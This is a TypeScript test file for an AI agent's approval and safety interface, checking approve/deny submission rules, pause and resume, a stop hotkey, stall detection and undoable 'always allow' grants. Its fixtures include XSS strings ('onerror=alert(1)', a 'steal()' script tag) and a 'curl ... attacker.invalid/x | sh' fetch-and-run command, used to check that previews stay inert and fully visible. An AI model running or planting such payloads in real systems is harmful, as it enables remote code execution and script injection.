// @vitest-environment jsdom

import { type ApprovalCard as Card, DEFAULT_AUTONOMY, LocalDotEvent } from "@localdot/protocol";
import {
  act,
  cleanup,
  fireEvent,
  render,
  renderHook,
  screen,
  waitFor,
} from "@testing-library/react";
import { afterEach, expect, it, vi } from "vitest";
import { createApi } from "../lib/api.ts";
import { ApprovalDecision } from "../shell/DecisionIsland.tsx";
import { notifyApproval } from "./approval-notification.ts";
import { taskStalled } from "./heartbeat.ts";
import { type AgentFeed, type AgentFeedState, emptyAgentModel } from "./model.ts";
import { projectAgentEvent } from "./reducer.ts";
import type { AgentSessionView } from "./useAgentSession.ts";
import { type SafetyProps, useSafety } from "./useSafety.ts";
import { useStopHotkey } from "./useStopHotkey.ts";

const CELL = "01J00000000000000000000001",
  SESSION = "01J00000000000000000000002",
  ID = "01J00000000000000000000003",
  OTHER = "01J00000000000000000000004";
const card: Card = {
  approvalId: ID,
  generation: 1,
  revision: 1,
  expiresAt: Date.now() + 60000,
  actionClass: "send",
  risk: "high",
  title: "<img src=x onerror=alert(1)>",
  fields: [
    ["Recipient", "Synthetic person"],
    ["Body", "<script>steal()</script>"],
  ],
};
afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  sessionStorage.clear();
});
function fixture(fetchImpl: typeof fetch, approval: Card | null = card) {
  document.body.tabIndex = -1;
  document.body.focus();
  const model = { ...emptyAgentModel(), approval };
  let state: AgentFeedState = {
    cellId: CELL,
    sessionId: SESSION,
    epoch: 7,
    connection: "live",
    replayed: true,
    history: true,
    streamError: null,
    model,
  };
  const listeners = new Set<() => void>();
  const feed: AgentFeed = {
    read: () => state,
    subscribe: (callback) => {
      listeners.add(callback);
      return () => {
        listeners.delete(callback);
      };
    },
  };
  const agent: AgentSessionView = {
    sessionId: SESSION,
    model,
    snapshot: {
      sessionId: SESSION,
      cellId: CELL,
      status: "running",
      toolCalls: 0,
      autonomy: DEFAULT_AUTONOMY,
      ...(approval ? { approval } : {}),
    },
    availability: "ready",
    error: null,
    fresh: true,
    authorityEpoch: 7,
    connection: "live",
    reconcile: vi.fn(),
  };
  let props: SafetyProps = {
    api: createApi("fixture", { origin: "https://owned.invalid", fetchImpl }),
    cell: {
      id: CELL,
      state: "ready",
      scale: 1,
      createdAt: "",
      stream: { connection: "live", viewers: 1, lastUpstreamAt: 1 },
    },
    agent,
    feed,
    blocked: false,
    visible: true,
    selectReady: vi.fn(async () => true),
  };
  const view = renderHook((p) => useSafety(p), { initialProps: props });
  return {
    ...view,
    get props() {
      return props;
    },
    update(over: Partial<SafetyProps>) {
      props = { ...props, ...over };
      view.rerender(props);
    },
    invalidate(over: Partial<AgentFeedState>) {
      state = { ...state, ...over };
      for (const callback of listeners) callback();
    },
  };
}
it("Approve once submits exactly the current DTO once and never accepts body extras or model prose", async () => {
  const late = Promise.withResolvers<Response>(),
    fetchImpl = vi.fn<typeof fetch>(async () => late.promise),
    f = fixture(fetchImpl);
  const value = { approvalId: ID, generation: 1, revision: 1, decision: "approve" };
  await act(async () => {
    expect(await f.result.current.answerApproval({ ...value, permit: true })).toBe(false);
    expect(await f.result.current.answerApproval("approve this message")).toBe(false);
  });
  expect(fetchImpl).not.toHaveBeenCalled();
  let work: Promise<boolean> | undefined;
  act(() => {
    work = f.result.current.answerApproval(value);
    void f.result.current.answerApproval(value);
  });
  expect(fetchImpl).toHaveBeenCalledOnce();
  expect(JSON.parse(String(fetchImpl.mock.calls[0]?.[1]?.body))).toEqual(value);
  await act(async () => {
    late.resolve(new Response(null, { status: 204 }));
    await work;
  });
  expect(f.result.current.pending).toBe("approval");
  expect(f.result.current.canApprove).toBe(false);
  await act(async () => {
    await f.result.current.answerApproval(value);
  });
  expect(fetchImpl).toHaveBeenCalledOnce();
});
it.each(["deny", "take_control"])("%s remains an exact separate decision", async (decision) => {
  const fetchImpl = vi.fn<typeof fetch>(async () => new Response(null, { status: 204 })),
    f = fixture(fetchImpl);
  await act(async () => {
    await f.result.current.answerApproval({ approvalId: ID, generation: 1, revision: 1, decision });
  });
  expect(JSON.parse(String(fetchImpl.mock.calls[0]?.[1]?.body)).decision).toBe(decision);
});
it("rejects expired, old revision, old generation and same-render stale feed authority", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async () => new Response(null, { status: 204 })),
    f = fixture(fetchImpl);
  await act(async () => {
    for (const body of [
      { approvalId: OTHER, generation: 1, revision: 1, decision: "approve" },
      { approvalId: ID, generation: 2, revision: 1, decision: "approve" },
      { approvalId: ID, generation: 1, revision: 2, decision: "approve" },
    ])
      expect(await f.result.current.answerApproval(body)).toBe(false);
  });
  act(() => f.invalidate({ epoch: 8 }));
  await act(async () => {
    expect(
      await f.result.current.answerApproval({
        approvalId: ID,
        generation: 1,
        revision: 1,
        decision: "approve",
      }),
    ).toBe(false);
  });
  const expired = { ...card, expiresAt: Date.now() - 1 };
  f.update({
    agent: {
      ...f.props.agent,
      snapshot: {
        ...(f.props.agent.snapshot ?? {
          sessionId: SESSION,
          cellId: CELL,
          status: "running" as const,
          toolCalls: 0,
        }),
        approval: expired,
      },
      model: { ...f.props.agent.model, approval: expired },
    },
  });
  expect(f.result.current.canApprove).toBe(false);
  expect(fetchImpl).not.toHaveBeenCalled();
});
it("changed owner ignores late completion and cannot clear the newer card", async () => {
  const late = Promise.withResolvers<Response>(),
    fetchImpl = vi.fn<typeof fetch>(async () => late.promise),
    f = fixture(fetchImpl);
  let work: Promise<boolean> | undefined;
  act(() => {
    work = f.result.current.answerApproval({
      approvalId: ID,
      generation: 1,
      revision: 1,
      decision: "approve",
    });
  });
  const newer = { ...card, approvalId: OTHER, revision: 2 };
  act(() =>
    f.invalidate({
      sessionId: OTHER,
      epoch: 8,
      model: { ...f.props.agent.model, approval: newer },
    }),
  );
  f.update({
    agent: {
      ...f.props.agent,
      sessionId: OTHER,
      authorityEpoch: 8,
      model: { ...f.props.agent.model, approval: newer },
      snapshot: {
        ...(f.props.agent.snapshot ?? {
          sessionId: SESSION,
          cellId: CELL,
          status: "running" as const,
          toolCalls: 0,
        }),
        sessionId: OTHER,
        approval: newer,
      },
    },
  });
  await act(async () => {
    late.resolve(new Response(null, { status: 204 }));
    await work;
  });
  expect(f.result.current.approval?.approvalId).toBe(OTHER);
  expect(f.result.current.pending).toBeNull();
});
it("uncertain delivery never retries and needs an explicit current reread", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async () => {
      throw new Error("lost acknowledgement");
    }),
    f = fixture(fetchImpl);
  await act(async () => {
    await f.result.current.answerApproval({
      approvalId: ID,
      generation: 1,
      revision: 1,
      decision: "approve",
    });
  });
  expect(f.result.current.error).toMatch(/unconfirmed/);
  expect(f.result.current.canApprove).toBe(false);
  f.update({
    agent: {
      ...f.props.agent,
      snapshot: {
        ...(f.props.agent.snapshot ?? {
          sessionId: SESSION,
          cellId: CELL,
          status: "running" as const,
          toolCalls: 0,
        }),
      },
    },
  });
  expect(f.result.current.canApprove).toBe(false);
  act(() => f.result.current.checkAgain());
  f.update({
    agent: {
      ...f.props.agent,
      snapshot: {
        ...(f.props.agent.snapshot ?? {
          sessionId: SESSION,
          cellId: CELL,
          status: "running" as const,
          toolCalls: 0,
        }),
      },
    },
  });
  expect(f.result.current.canApprove).toBe(true);
  expect(fetchImpl).toHaveBeenCalledOnce();
});
it("a Pause acknowledgement cannot advertise settled Resume before a matching public snapshot", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (_url, init) => {
      const input = JSON.parse(String(init?.body));
      return Response.json(
        {
          requestId: input.requestId,
          revision: 1,
          phase: "paused",
          reason: "user",
          atStepBoundary: true,
          resumeAvailable: true,
        },
        { status: 202 },
      );
    }),
    f = fixture(fetchImpl, null);
  await act(async () => {
    await f.result.current.requestPause();
  });
  expect(f.result.current.pause?.phase).toBe("pausing");
  expect(f.result.current.canResume).toBe(false);
  const input = JSON.parse(String(fetchImpl.mock.calls[0]?.[1]?.body));
  const pause = {
    requestId: input.requestId,
    revision: 3,
    phase: "paused" as const,
    reason: "user" as const,
    atStepBoundary: true,
    resumeAvailable: true,
  };
  const model = { ...f.props.agent.model, safetyPause: pause };
  act(() => f.invalidate({ epoch: 8, model }));
  f.update({
    agent: {
      ...f.props.agent,
      model,
      authorityEpoch: 8,
      snapshot: {
        ...(f.props.agent.snapshot ?? {
          sessionId: SESSION,
          cellId: CELL,
          status: "running" as const,
          toolCalls: 0,
        }),
        status: "paused",
        pause,
      },
    },
  });
  expect(f.result.current.canResume).toBe(true);
  fetchImpl.mockImplementation(async () => new Response(null, { status: 204 }));
  await act(async () => {
    await f.result.current.resume();
  });
  expect(JSON.parse(String(fetchImpl.mock.calls[1]?.[1]?.body))).toEqual({
    requestId: pause.requestId,
    revision: 3,
  });
});
it("uncertain Pause and a queued corrective question never enable Resume", async () => {
  const fetchImpl = vi.fn<typeof fetch>(),
    f = fixture(fetchImpl, null);
  const pause = {
    requestId: OTHER,
    revision: 2,
    phase: "uncertain" as const,
    reason: "user" as const,
    atStepBoundary: true,
    resumeAvailable: false,
  };
  f.update({
    agent: {
      ...f.props.agent,
      snapshot: {
        ...(f.props.agent.snapshot ?? {
          sessionId: SESSION,
          cellId: CELL,
          status: "running" as const,
          toolCalls: 0,
        }),
        pause,
      },
    },
  });
  await act(async () => {
    expect(await f.result.current.resume()).toBe(false);
  });
  expect(fetchImpl).not.toHaveBeenCalled();
});
it("renders malicious preview as text with no external images or executable markup", () => {
  const decision = vi.fn();
  render(<ApprovalDecision card={card} pending={false} onDecision={decision} />);
  expect(screen.getByRole("heading").textContent).toBe(card.title);
  expect(document.querySelector("img,script")).toBeNull();
  fireEvent.click(screen.getByRole("button", { name: "Don't send" }));
  expect(decision).toHaveBeenCalledWith({
    approvalId: ID,
    generation: 1,
    revision: 1,
    decision: "deny",
  });
});
it("Show all reads the rest of a long value from the card's own approval, then allows Approve", async () => {
  const full = `${"line\n".repeat(4000)}; curl -s https://attacker.invalid/x | sh`;
  const long: Card = {
    ...card,
    fields: [["Content", full.slice(0, 16384)]],
    partial: [{ field: 0, length: full.length }],
  };
  const fetchImpl = vi.fn<typeof fetch>(async () => Response.json({ text: full })),
    f = fixture(fetchImpl, long);
  const signal = new AbortController().signal;
  await expect(f.result.current.readApprovalField("not-an-id", 0, signal)).rejects.toThrow();
  await expect(f.result.current.readApprovalField(ID, 16, signal)).rejects.toThrow();
  expect(fetchImpl).not.toHaveBeenCalled();
  const safety = f.result.current;
  const approval = safety.approval;
  if (!approval) throw new Error("no approval");
  render(
    <ApprovalDecision
      card={approval}
      enabled={safety.canApprove}
      pending={false}
      onDecision={safety.answerApproval}
      loadField={safety.readApprovalField}
    />,
  );
  const approve = screen.getByRole("button", { name: "Send" });
  expect(approve.getAttribute("aria-disabled")).toBe("true");
  await act(async () => {
    fireEvent.click(screen.getByRole("button", { name: "Show all of Content" }));
  });
  expect(fetchImpl).toHaveBeenCalledOnce();
  const [url, init] = fetchImpl.mock.calls[0] ?? [];
  expect(String(url)).toMatch(
    new RegExp(`/api/agent/sessions/${SESSION}/approvals/${ID}/fields/0$`),
  );
  expect(init?.method).toBe("GET");
  expect(screen.getByRole("dialog").textContent).toContain("attacker.invalid");
  expect(approve.getAttribute("aria-disabled")).toBeNull();
});
it("expired card leaves all decisions disabled", () => {
  const decision = vi.fn();
  render(
    <ApprovalDecision
      card={{ ...card, expiresAt: Date.now() - 1 }}
      pending={false}
      onDecision={decision}
    />,
  );
  for (const button of screen.getAllByRole("button")) {
    expect(button.getAttribute("aria-disabled")).toBe("true");
    fireEvent.click(button);
  }
  expect(decision).not.toHaveBeenCalled();
});
it("Notification click focuses only and deduplicates the same owned card without preview secrets", () => {
  const notices: { title: string; onclick?: () => void; close: () => void }[] = [];
  class Notice {
    static permission = "granted";
    onclick?: () => void;
    close = vi.fn();
    constructor(public title: string) {
      notices.push(this);
    }
  }
  vi.stubGlobal("Notification", Notice);
  const focus = vi.fn(),
    seen = new Set<string>();
  notifyApproval(card, SESSION, seen, focus);
  notifyApproval(card, SESSION, seen, focus);
  expect(notices).toHaveLength(1);
  expect(notices[0]?.title).toBe("localDot needs your decision");
  notices[0]?.onclick?.();
  expect(focus).toHaveBeenCalledOnce();
});
it("notification permission failure leaves the visible approval usable", () => {
  class Notice {
    static permission = "granted";
    constructor() {
      throw new Error("denied");
    }
  }
  vi.stubGlobal("Notification", Notice);
  expect(notifyApproval(card, SESSION, new Set(), vi.fn())).toMatch(/could not be shown/);
  render(<ApprovalDecision card={card} pending={false} onDecision={vi.fn()} />);
  expect(screen.getByRole("button", { name: "Send" }).getAttribute("aria-disabled")).toBeNull();
});
it("Stop chord stays reachable in text and dialogs without hijacking normal typing or IME", () => {
  const stop = vi.fn();
  renderHook(() => useStopHotkey(stop, true));
  const input = document.createElement("textarea");
  document.body.append(input);
  input.focus();
  const send = (extra: KeyboardEventInit) => {
    const e = new KeyboardEvent("keydown", { bubbles: true, cancelable: true, ...extra });
    input.dispatchEvent(e);
    return e.defaultPrevented;
  };
  expect(send({ key: ".", code: "Period" })).toBe(false);
  expect(send({ key: "Escape" })).toBe(false);
  expect(send({ key: ">", code: "Period", metaKey: true, shiftKey: true, isComposing: true })).toBe(
    false,
  );
  expect(send({ key: ">", code: "Period", ctrlKey: true, shiftKey: true })).toBe(true);
  expect(stop).toHaveBeenCalledOnce();
  const dialog = document.createElement("div");
  dialog.setAttribute("role", "dialog");
  dialog.append(input);
  document.body.append(dialog);
  expect(send({ key: ">", code: "Period", metaKey: true, shiftKey: true })).toBe(true);
  expect(stop).toHaveBeenCalledTimes(2);
  dialog.remove();
});
it("heartbeat uses local monotonic receipt time, with exact threshold and held-state suppression", () => {
  const f = fixture(vi.fn<typeof fetch>(), null);
  const agent = {
    ...f.props.agent,
    model: {
      ...f.props.agent.model,
      state: { state: "acting" as const },
      lastHeartbeat: { t: 999999999, everyMs: 500, ongoing: true, receivedAt: 20 },
    },
  };
  expect(taskStalled(agent, 1520)).toBe(false);
  expect(taskStalled(agent, 1521)).toBe(true);
  for (const model of [
    { ...agent.model, pendingAsk: ID },
    { ...agent.model, pendingTakeover: ID },
    { ...agent.model, approval: card },
    { ...agent.model, safetyPaused: { paused: true, atStepBoundary: true } },
    { ...agent.model, lastHeartbeat: { ...agent.model.lastHeartbeat, ongoing: false } },
  ])
    expect(taskStalled({ ...agent, model }, 10000)).toBe(false);
});
it("heartbeat warns during the work that follows a settled wait, but not during a recovery pause", () => {
  const f = fixture(vi.fn<typeof fetch>(), null);
  const late = (state: { state: "waiting_user" | "paused"; reason: string }) =>
    taskStalled(
      {
        ...f.props.agent,
        model: {
          ...f.props.agent.model,
          state,
          lastHeartbeat: { t: 999999999, everyMs: 500, ongoing: true, receivedAt: 20 },
        },
      },
      10000,
    );
  for (const reason of ["approval", "question", "takeover"])
    expect(late({ state: "waiting_user", reason })).toBe(true);
  for (const reason of ["user", "approval", "Waiting for explicit Resume"])
    expect(late({ state: "paused", reason })).toBe(true);
  expect(late({ state: "paused", reason: "budget" })).toBe(false);
});
it("fenced replacement selects only a separately reconciled Ready candidate, once", async () => {
  const candidate = "01J00000000000000000000009",
    record = {
      requestId: OTHER,
      oldCellId: CELL,
      revision: 4,
      phase: "ready",
      newCellId: candidate,
    };
  let posted = false;
  const fetchImpl = vi.fn<typeof fetch>(async (url, init) => {
    if (String(url).endsWith("/fence")) return Response.json({ revision: 4 });
    if (init?.method === "POST") {
      posted = true;
      record.requestId = JSON.parse(String(init.body)).requestId;
      return Response.json(record);
    }
    return Response.json(posted ? { ...record, phase: "allocating" } : record);
  });
  const f = fixture(fetchImpl, null);
  f.update({
    cell: {
      ...(f.props.cell ?? {
        id: CELL,
        state: "ready" as const,
        scale: 1 as const,
        createdAt: "",
        stream: { connection: "none" as const, viewers: 0, lastUpstreamAt: null },
      }),
      fenced: { revision: 4 },
      state: "failed",
    },
    agent: { ...f.props.agent, fresh: false },
  });
  await act(async () => {
    await f.result.current.replace();
  });
  expect(f.props.selectReady).not.toHaveBeenCalled();
  await act(async () => {
    await f.result.current.replace();
  });
  expect(fetchImpl.mock.calls.filter(([, init]) => init?.method === "POST")).toHaveLength(1);
});

it("reconciled Ready publishes the fresh owner once, even after a lost mutation reply", async () => {
  let requestId = "",
    posts = 0,
    reads = 0;
  const candidate = "01J00000000000000000000009";
  const fetchImpl = vi.fn<typeof fetch>(async (url, init) => {
    if (String(url).endsWith("/fence")) return Response.json({ revision: 4 });
    if (init?.method === "POST") {
      requestId = JSON.parse(String(init.body)).requestId;
      posts++;
      throw new Error("lost response");
    }
    reads++;
    return Response.json({
      requestId,
      oldCellId: CELL,
      revision: 4,
      phase: "ready",
      newCellId: candidate,
    });
  });
  const f = fixture(fetchImpl, null);
  const cell = {
    id: CELL,
    state: "failed" as const,
    scale: 1 as const,
    createdAt: "",
    stream: { connection: "none" as const, viewers: 0, lastUpstreamAt: null },
    fenced: { revision: 4 },
  };
  f.update({ cell, agent: { ...f.props.agent, fresh: false } });
  await act(async () => {
    await f.result.current.replace();
  });
  expect(f.props.selectReady).not.toHaveBeenCalled();
  await waitFor(() => expect(f.props.selectReady).toHaveBeenCalledWith(candidate), {
    timeout: 2500,
  });
  expect(posts).toBe(1);
  expect(reads).toBe(1);
  expect(f.result.current.canReplace).toBe(false);
});

it.each(["matching", "other request", "other revision", "legacy"] as const)(
  "Resume uses an exact actual safety.pause event: %s",
  async (mode) => {
    const pause = {
      requestId: ID,
      revision: 3,
      phase: "paused" as const,
      reason: "user" as const,
      atStepBoundary: true,
      resumeAvailable: true,
    };
    const observed =
      mode === "other request"
        ? { ...pause, requestId: OTHER }
        : mode === "other revision"
          ? { ...pause, revision: 4 }
          : pause;
    const event = LocalDotEvent.parse({
      v: 1,
      id: OTHER,
      seq: 1,
      t: 1000,
      agent: "main",
      type: mode === "legacy" ? "pause.change" : "safety.pause",
      data:
        mode === "legacy"
          ? { paused: true, atStepBoundary: true }
          : { revision: 7, pause: observed },
    });
    const model = projectAgentEvent(emptyAgentModel(), event);
    const fetchImpl = vi.fn<typeof fetch>(async () => new Response(null, { status: 204 })),
      f = fixture(fetchImpl, null);
    act(() => f.invalidate({ model, epoch: 8 }));
    f.update({
      agent: {
        ...f.props.agent,
        model,
        authorityEpoch: 8,
        snapshot: { sessionId: SESSION, cellId: CELL, status: "paused", toolCalls: 0, pause },
      },
    });
    expect(f.result.current.canResume).toBe(mode === "matching");
    await act(async () => {
      expect(await f.result.current.resume()).toBe(mode === "matching");
    });
    expect(fetchImpl).toHaveBeenCalledTimes(mode === "matching" ? 1 : 0);
    if (mode === "matching")
      expect(JSON.parse(String(fetchImpl.mock.calls[0]?.[1]?.body))).toEqual({
        requestId: ID,
        revision: 3,
      });
  },
);
it("losing window focus closes decision admission until focus returns", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async () => Response.json({ accepted: true })),
    f = fixture(fetchImpl);
  act(() => window.dispatchEvent(new Event("blur")));
  expect(f.result.current.canApprove).toBe(false);
  await act(async () => {
    expect(
      await f.result.current.answerApproval({
        approvalId: ID,
        generation: 1,
        revision: 1,
        decision: "approve",
      }),
    ).toBe(false);
  });
  expect(fetchImpl).not.toHaveBeenCalled();
  act(() => window.dispatchEvent(new Event("focus")));
  expect(f.result.current.canApprove).toBe(false);
  act(() => {
    const field = document.createElement("input");
    document.body.append(field);
    field.focus();
    document.body.focus();
    field.remove();
  });
  expect(f.result.current.canApprove).toBe(true);
});
const RULE = "01J00000000000000000000009";
const offered: Card = {
  ...card,
  always: [
    { scope: "task", label: "For this task" },
    { scope: "site", label: "On mail.example.test", site: "https://mail.example.test" },
  ],
};
const approve = { approvalId: ID, generation: 1, revision: 1, decision: "approve" };
it("Always allow sends only a scope the card offered, then keeps the choice for Undo", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async () => new Response(null, { status: 204 })),
    f = fixture(fetchImpl, offered);
  await act(async () => {
    expect(await f.result.current.answerApproval({ ...approve, always: "always" })).toBe(false);
    expect(await f.result.current.answerApproval({ ...approve, always: "app" })).toBe(false);
    expect(
      await f.result.current.answerApproval({ ...approve, decision: "deny", always: "task" }),
    ).toBe(false);
  });
  expect(fetchImpl).not.toHaveBeenCalled();
  expect(f.result.current.allowed).toBeNull();
  await act(async () => {
    expect(await f.result.current.answerApproval({ ...approve, always: "site" })).toBe(true);
  });
  expect(JSON.parse(String(fetchImpl.mock.calls[0]?.[1]?.body))).toEqual({
    ...approve,
    always: "site",
  });
  expect(f.result.current.allowed).toEqual({
    session: SESSION,
    approvalId: ID,
    actionClass: "send",
    option: offered.always?.[1],
    undo: "idle",
  });
  act(() => f.result.current.dismissAllowed());
  expect(f.result.current.allowed).toBeNull();
});
it("a card without options refuses any Always allow scope", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async () => new Response(null, { status: 204 })),
    f = fixture(fetchImpl);
  await act(async () => {
    expect(await f.result.current.answerApproval({ ...approve, always: "task" })).toBe(false);
  });
  expect(fetchImpl).not.toHaveBeenCalled();
});
it.each([
  ["task", `/api/agent/sessions/${SESSION}/allowances/send`, undefined],
  ["site", `/api/agent/rules/${RULE}`, RULE],
] as const)("Undo of a %s choice sends its DELETE once", async (scope, path, ruleId) => {
  const fetchImpl = vi.fn<typeof fetch>(async () => new Response(null, { status: 204 })),
    f = fixture(fetchImpl, offered);
  await act(async () => {
    await f.result.current.answerApproval({ ...approve, always: scope });
  });
  await act(async () => {
    expect(await f.result.current.undoAllowed()).toBe(false);
  });
  expect(fetchImpl).toHaveBeenCalledOnce();
  const option = offered.always?.find((value) => value.scope === scope);
  if (!option) throw new Error("option");
  const rule = { ...option, actionClass: "send" as const, ...(ruleId ? { id: ruleId } : {}) };
  f.update({
    agent: {
      ...f.props.agent,
      model: {
        ...f.props.agent.model,
        approval: null,
        approvalOutcome: { approvalId: ID, decision: "approve", actionClass: "send", rule },
      },
    },
  });
  await act(async () => {
    expect(await f.result.current.undoAllowed()).toBe(true);
  });
  const [url, init] = fetchImpl.mock.calls[1] ?? [];
  expect(String(url)).toBe(`https://owned.invalid${path}`);
  expect(init?.method).toBe("DELETE");
  expect(init?.body).toBeUndefined();
  expect(f.result.current.allowed?.undo).toBe("done");
  await act(async () => {
    expect(await f.result.current.undoAllowed()).toBe(false);
  });
  expect(fetchImpl).toHaveBeenCalledTimes(2);
});
it("a failed Undo can be tried again, a missing one counts as undone, and a new task forgets it", async () => {
  const statuses = [204, 500, 404];
  const fetchImpl = vi.fn<typeof fetch>(
    async () => new Response(null, { status: statuses.shift() ?? 204 }),
  );
  const f = fixture(fetchImpl, offered);
  await act(async () => {
    await f.result.current.answerApproval({ ...approve, always: "task" });
  });
  f.update({
    agent: {
      ...f.props.agent,
      model: {
        ...f.props.agent.model,
        approvalOutcome: {
          approvalId: ID,
          decision: "approve",
          actionClass: "send",
          rule: { scope: "task", label: "For this task", actionClass: "send" },
        },
      },
    },
  });
  await act(async () => {
    expect(await f.result.current.undoAllowed()).toBe(false);
  });
  expect(f.result.current.allowed?.undo).toBe("failed");
  await act(async () => {
    expect(await f.result.current.undoAllowed()).toBe(true);
  });
  expect(f.result.current.allowed?.undo).toBe("done");
  f.update({ agent: { ...f.props.agent, sessionId: OTHER } });
  expect(f.result.current.allowed).toBeNull();
});
it("a newer approval card replaces the last choice's status line", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async () => new Response(null, { status: 204 })),
    f = fixture(fetchImpl, offered);
  await act(async () => {
    await f.result.current.answerApproval({ ...approve, always: "task" });
  });
  expect(f.result.current.allowed).not.toBeNull();
  const snapshot = f.props.agent.snapshot;
  if (!snapshot) throw new Error("snapshot");
  f.update({
    agent: {
      ...f.props.agent,
      snapshot: { ...snapshot, approval: { ...offered, approvalId: OTHER } },
    },
  });
  expect(f.result.current.allowed).toBeNull();
});
it("keeps the choice when the reply is lost, since the task's record confirms it", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async () => {
      throw new TypeError("network");
    }),
    f = fixture(fetchImpl, offered);
  await act(async () => {
    expect(await f.result.current.answerApproval({ ...approve, always: "task" })).toBe(false);
  });
  expect(fetchImpl).toHaveBeenCalledOnce();
  expect(f.result.current.allowed?.option.scope).toBe("task");
});
const confirm = (f: ReturnType<typeof fixture>, outcome: Record<string, unknown>) =>
  f.update({
    agent: {
      ...f.props.agent,
      model: {
        ...f.props.agent.model,
        approval: null,
        approvalOutcome: { approvalId: ID, decision: "approve", actionClass: "send", ...outcome },
      },
    },
  });
const site = {
  scope: "site" as const,
  label: "On mail.example.test",
  site: "https://mail.example.test",
  actionClass: "send" as const,
};
it.each([
  ["the task saved a different choice", "task", { rule: { ...site, id: RULE } }],
  ["it was removed elsewhere", "site", { rule: { ...site, id: RULE }, ruleRemoved: true }],
  ["the saved choice has no id", "site", { rule: site }],
] as const)("Undo sends nothing when %s", async (_name, scope, outcome) => {
  const fetchImpl = vi.fn<typeof fetch>(async () => new Response(null, { status: 204 })),
    f = fixture(fetchImpl, offered);
  await act(async () => {
    await f.result.current.answerApproval({ ...approve, always: scope });
  });
  confirm(f, outcome);
  await act(async () => {
    expect(await f.result.current.undoAllowed()).toBe(false);
  });
  expect(fetchImpl).toHaveBeenCalledOnce();
  expect(f.result.current.allowed?.undo).toBe("idle");
});
it("an Undo still held from before a task switch sends nothing", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async () => new Response(null, { status: 204 })),
    f = fixture(fetchImpl, offered);
  await act(async () => {
    await f.result.current.answerApproval({ ...approve, always: "task" });
  });
  confirm(f, { rule: { scope: "task", label: "For this task", actionClass: "send" } });
  const undo = f.result.current.undoAllowed;
  f.update({ agent: { ...f.props.agent, sessionId: OTHER } });
  await act(async () => {
    expect(await undo()).toBe(false);
  });
  expect(fetchImpl).toHaveBeenCalledOnce();
});
